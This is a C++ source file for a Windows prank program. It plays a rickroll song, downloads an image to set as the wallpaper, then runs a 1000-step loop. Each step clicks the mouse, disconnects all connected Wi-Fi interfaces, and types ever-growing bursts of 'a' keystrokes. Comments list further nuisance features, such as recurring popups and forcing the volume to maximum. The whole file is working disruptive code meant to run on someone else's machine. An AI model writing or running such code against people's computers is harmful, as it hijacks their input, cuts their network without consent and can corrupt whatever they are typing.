#include "pch.h"
#include <windows.h> // Provides WinAPI access
#include <objbase.h> // Network objects
#include <wtypes.h> // Wide character types for Windows access
#include <wlanapi.h> // Network API
#include <stdlib.h> // C standard library
#include <WinUser.h> // Req header for keyboard input
#include <WinInet.h> // Req header for wallpaper-set function
#include <ShlObj.h> // Reg header for wallpaper-set objects
#include <cmath> // For exponential character output
#include <time.h>
#include <corecrt_wstring.h>
#include <curl/curl.h>
#include <stdio.h>
#include <direct.h>
#include <endpointvolume.h>
#include <mmdeviceapi.h>
#include <string>
#define GetCurrentDir _getcwd
#ifndef UNICODE // Req definition for Windows.h
#define UNICODE
#endif
#pragma comment(lib, "wlanapi.lib") // Lib for networking
#pragma comment(lib, "ole32.lib") // Lib for networking 
#pragma comment(lib, "Winmm.lib") // Lib for mp3 playing

void MoveCursor() {
	INPUT Input = { 0 };
	Input.type = INPUT_MOUSE;

	Input.mi.dx = (LONG)0;
	Input.mi.dy = (LONG)0;

	// set move cursor directly and left click
	Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;

	SendInput(1, &Input, sizeof(INPUT));
}



bool ChangeVolume(double nVolume, bool bScalar)
{

	HRESULT hr = NULL;
	bool decibels = false;
	bool scalar = false;
	double newVolume = nVolume;

	CoInitialize(NULL);
	IMMDeviceEnumerator *deviceEnumerator = NULL;
	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
		__uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
	IMMDevice *defaultDevice = NULL;

	hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
	deviceEnumerator->Release();
	deviceEnumerator = NULL;

	IAudioEndpointVolume *endpointVolume = NULL;
	hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
		CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
	defaultDevice->Release();
	defaultDevice = NULL;

	// -------------------------
	float currentVolume = 0;
	endpointVolume->GetMasterVolumeLevel(&currentVolume);
	//printf("Current volume in dB is: %f\n", currentVolume);

	hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
	//CString strCur=L"";
	//strCur.Format(L"%f",currentVolume);
	//AfxMessageBox(strCur);

	// printf("Current volume as a scalar is: %f\n", currentVolume);
	if (bScalar == false)
	{
		hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
	}
	else if (bScalar == true)
	{
		hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
	}
	endpointVolume->Release();

	CoUninitialize();

	return FALSE;
}


DWORD WINAPI PlaySong(LPVOID lpParameter) {
	mciSendString("open \"C:\\Users\\Chittoh\\Music\\rickroll.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
	mciSendString("play mp3 wait", NULL, 0, NULL);
	return 0;
}

void SetWallpaper(LPCWSTR file) {
	CoInitializeEx(0, COINIT_APARTMENTTHREADED);
	IActiveDesktop* desktop;
	HRESULT status = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&desktop);
	WALLPAPEROPT wOption;
	ZeroMemory(&wOption, sizeof(WALLPAPEROPT));
	wOption.dwSize = sizeof(WALLPAPEROPT);
	wOption.dwStyle = WPSTYLE_CENTER;
	status = desktop->SetWallpaper(file, 0);
	wprintf(L"%ld", status);
	status = desktop->SetWallpaperOptions(&wOption, 0);
	wprintf(L"%ld", status);
	status = desktop->ApplyChanges(AD_APPLY_ALL);
	wprintf(L"%ld", status);
	desktop->Release();
	CoUninitialize();
}

int KillWifi() {
	// Declare and initialize variables.

	HANDLE hClient = NULL;
	DWORD dwMaxClient = 2;
	DWORD dwCurVersion = 0;
	DWORD dwResult = 0;

	WCHAR GuidString[40] = { 0 };

	dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient); //  
	if (dwResult != ERROR_SUCCESS) {
		// FormatMessage can be used to find out why the function failed
		return 1;
	}

	/* variables used for WlanEnumInterfaces  */

	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; // interface listing catch buffer
	PWLAN_INTERFACE_INFO pIfInfo = NULL; // interface information catch buffer

	dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
	if (dwResult != ERROR_SUCCESS) {
		// FormatMessage can be used to find out why the function failed
		return 1;
	}
	else {
		for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
			pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
			if (pIfInfo->isState == wlan_interface_state_connected) {
				DWORD close = WlanDisconnect(hClient, &pIfInfo->InterfaceGuid, NULL);
				/*if (close != ERROR_SUCCESS) {
					std::cout << "Failed to disconnect interface" << std::endl;
				}
				else {
					std::cout << "Successfully disconnected from network" << std::endl;
				}*/
			}
			else {
				//std::cout << "Interface not connected" << std::endl;
				break;
			}
		}
	}

	if (pIfList != NULL) { // tests if Interface list contains anything (anything was use during the bulk of function execution)
		WlanFreeMemory(pIfList); // if it was used: free the memory and set it to NULL, for future use
		pIfList = NULL;
	}
	return 0; // ends function
}

int KeyPress() {
	INPUT ip; // Initializes input object
	ip.type = INPUT_KEYBOARD;
	ip.ki.wScan = 0;
	ip.ki.time = 0;
	ip.ki.dwExtraInfo = 0;

	ip.ki.wVk = 0x41; // Key code for 'a' key (can change this so is random?)
	ip.ki.dwFlags = 0;
	SendInput(1, &ip, sizeof(INPUT)); // Presses the 'a' key

	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT)); // Releases key

	return 0;
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	size_t written;
	written = fwrite(ptr, size, nmemb, stream);
	return written;
}

size_t DownloadFile(std::string url, char* outfilename) {
	CURL *curl;
	FILE *fp;
	CURLcode res;
	curl = curl_easy_init();
	if (curl) {
		fp = fopen(outfilename, "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);
		return 0;
	}
	return 1;
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	HANDLE threadHandler = CreateThread(0, 0, PlaySong, NULL, 0, 0); // starts rickroll thread to get out of way for other routines to execute
	int count = 0;
	std::string url = "https://i.ytimg.com/vi/ibr6egCSqiE/maxresdefault.jpg";

	char cCurrentPath[FILENAME_MAX];

	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath)))
	{
		return 1;
	}

	cCurrentPath[sizeof(cCurrentPath) - 1] = '\0'; /* not really required */

	char outfilename[FILENAME_MAX] = "file.jpg";
	char file[FILENAME_MAX] = "\\file.jpg";

	std::string final = strcat(cCurrentPath, file);
	DownloadFile(url, outfilename);
	std::wstring ws(final.begin(), final.end());
	LPCWSTR fin = ws.c_str();
	SetWallpaper(fin);

	while (count < 1000) { // # of reps
		int v1 = 1;
		if (v1) {
			MoveCursor();
		}
		KillWifi();
		count++;
		for (int i = 1; i < pow(count + 1, 2); i++) {
			KeyPress();
		}
		Sleep(2000); // Wait time
	}
	CloseHandle(threadHandler);

	return 0;
}

/*
	Ideas to add:
		1. Add continually popping up Soviet Popup (https://stackoverflow.com/questions/1186017/how-do-i-build-a-graphical-user-interface-in-c)
			(http://www.cplusplus.com/forum/beginner/137030/)
			(https://stackoverflow.com/questions/2886609/how-to-make-multiple-windows-using-win32-api)
			(http://www.winprog.org/tutorial/start.html)


		2. Change machine volume to 100 (https://stackoverflow.com/questions/25923454/windows-audio-endpoint-api-getting-the-names-of-my-audio-devices)
			(https://docs.microsoft.com/en-us/windows/desktop/api/Endpointvolume/nn-endpointvolume-iaudioendpointvolume)
			(https://docs.microsoft.com/en-us/windows/desktop/CoreAudio/endpoint-volume-controls)
			(https://docs.microsoft.com/en-us/windows/desktop/CoreAudio/endpointvolume-api)
			(https://docs.microsoft.com/en-us/windows/desktop/coreaudio/endpointvolume-api)
			(https://docs.microsoft.com/en-us/previous-versions//bb331828(v=vs.85)
			(https://www.codeproject.com/Articles/1207799/Cool-dummy-volume-meter-in-DOS-mode)
			(https://docs.microsoft.com/en-us/windows/desktop/CoreAudio/wasapi)
			(https://stackoverflow.com/questions/14771775/how-to-change-master-volume-programmatically)

*/